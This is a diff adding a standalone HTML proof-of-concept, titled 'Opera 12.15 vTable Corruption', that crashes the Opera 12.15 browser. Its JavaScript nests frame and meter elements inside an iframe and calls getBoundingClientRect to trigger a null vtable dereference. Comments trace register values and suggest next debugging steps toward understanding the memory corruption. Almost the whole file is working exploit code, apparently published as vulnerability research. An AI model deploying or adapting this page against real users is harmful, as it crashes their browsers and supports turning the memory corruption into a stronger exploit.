@@ -1,0 +1,65 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title> Opera 12.15 DOS POC</title>
+</head>
+<body>
+<iframe id="wnd"></iframe>
+<script type="text/javascript" language="JavaScript">
+
+ /* 
+   Title: Opera 12.15 vTable Corruption
+   Author: echo
+   Test: Windows 7 x64
+   Version: Opera 12.15 Win32
+   Link: www.opera.com
+ */
+
+  var wnd = document.getElementById("wnd");
+      wnd = wnd.contentWindow;
+        
+  function d00m()
+  {     
+               var tag   = [];
+               tag.push(document.createElement("frame"));
+               tag.push(document.createElement("meter"));
+            
+               wnd.document.body.appendChild(tag[0]);
+               wnd.document.body.appendChild(tag[1]);
+
+               /* step 1*/
+               var obj   = tag[1];
+                  
+               var obj_1 = tag[0];
+                      
+               try{ obj_1.appendChild(obj); }catch(b){}
+                                                                /* eax = [esi + 14h] = this->unknow20 */
+               try{ obj_1.getBoundingClientRect(); }catch(a){}  /* ecx = [eax + 14h] = this->unknow20->unknow20 */
+                                                                /* eax = [ecx] = this->unknow20->unknow20[vtBl] (correnct) */
+               /* step 2*/   
+               var obj   = tag[0];
+      
+               var obj_1 = tag[1];
+                    
+               try{ obj_1.appendChild(obj); }catch(b){}       
+             
+               try{ obj_1.getBoundingClientRect();}catch(a){}   /* eax = [esi + 14h] = this->unknow20 */
+                                                                /* ecx = [eax + 14h] = this->unknow20->unknow20 */      
+    }                                                           /* eax = [ecx] = this->unknow20->unknow20[vtBl] (uncorrect) 0x00000000 reference */
+    
+    d00m();
+
+
+    /* so we have here some kind of memory corruption */
+    /* in "step 1" "vulnerable" code works fine he gets refernce to vtable and do some stuff */
+    /* in "step 2" the same code do the same thing but vtable of refernced object is corrupted and has value 0x0000000*/
+    /* logically next step should be checking why the vtable in "step 2" is corrupted */
+    /* i observed heap allocation and free function between "step 1" and "step 2" - no alloc and free of intersting area occurs (but maybe i fuckup something) */
+    /* We also can set mem access breakpoint on [eax+14h] at the right moment to find out what corrupt vtable */
+     
+    
+    
+   </script>
+   <!--088241c155f232f70fcae7020157b9dcff210b84-->
+  </body>
+</html>
